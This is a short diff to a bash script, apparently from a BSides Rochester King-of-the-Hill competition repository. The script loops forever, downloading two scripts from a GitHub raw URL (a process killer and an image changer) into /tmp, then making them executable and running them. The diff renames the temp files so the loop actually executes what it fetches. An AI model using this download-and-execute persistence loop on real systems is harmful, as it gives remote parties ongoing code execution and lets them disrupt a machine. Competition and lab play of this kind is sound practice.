@@ -1,10 +1,10 @@
 !#/bin/bash
 while :
 do
-	wget -O /tmp/sdf.sh https://raw.githubusercontent.com/bd3r/BsidesRochesterKOTH/master/killpross.sh
-	wget -O /tmp/zxc.sh https://raw.githubusercontent.com/bd3r/BsidesRochesterKOTH/master/changeImage.sh
+	wget -O /tmp/aldskf.sh https://raw.githubusercontent.com/bd3r/BsidesRochesterKOTH/master/killpross.sh
+	wget -O /tmp/djflw.sh https://raw.githubusercontent.com/bd3r/BsidesRochesterKOTH/master/changeImage.sh
 
 	sleep 1
-	chmod +x /tmp/df.sh & chmod +x /tmp/zxc.sh
-	/tmp/one.sh & /tmp/two.sh  
+	chmod +x /tmp/aldskf.sh & chmod +x /tmp/djflw.sh
+	/tmp/aldskf.sh & /tmp/djflw.sh  
 done
